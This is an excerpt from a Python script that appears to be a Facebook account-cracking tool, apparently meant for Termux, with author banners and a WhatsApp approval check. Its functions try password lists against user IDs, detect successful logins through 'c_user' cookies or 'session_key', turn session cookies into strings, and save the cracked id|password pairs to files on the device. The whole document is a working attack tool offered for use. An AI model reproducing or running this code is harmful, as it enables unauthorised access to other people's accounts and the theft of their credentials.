#SP(HAIYAT MAHMUD)(HAIYAT. MAHMUD)
#WhatsApp : 01738795752
#Github : haiyat
from os import path
...
\__|  \__|\__|  \__|   \__|    \__|  \__|  \__|   
    ...
    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : HAIYAT MAHMUD            │
    │ [✓] GITHUB   : haiyat                │
    │ [✓] WHATSAPP : +8801738795752         │
    │ [✓] VERSION  : 0.2                    │
  ...
  os.system(f'xdg-open {tan}://www.facebook.com/haiyat01601162005')
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+8801738795752?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
\__|  \__|\__|  \__|   \__|    \__|  \__|  \__|   
    ...
    │ [✓] AUTHOR   : HAYAT MAHMUD            │
    │ [✓] GITHUB   : haiyat                │
    │ [✓] WHATSAPP : +88011738795752         │
    │ [✓] VERSION  : 0.2                    │
    │ [✓] POWER BY : \033[1;32mPRO HAIYAT \033[1;37m            │
    └───────────────────────────────────────┘""")
...
def ffb3(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [HAYAT1x1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [HAIYAT-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
...
def ffb4(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [HAYAT1x1-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Haiyat:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;37m [HAIYAT-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/HAIYAT-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Haiyat:
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [HAIYAT1x1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [HAYAT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/SPY-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [HAYAT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/HAIYAT-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [HAYAT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/HAYAT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open(f'/sdcard/HAYAT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Haiyat:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [HAYAT-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[HAYAT-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[HAYAT-CP] '+idf+' | '+ps+'\033[0;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open(f'/sdcard/haiyat.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
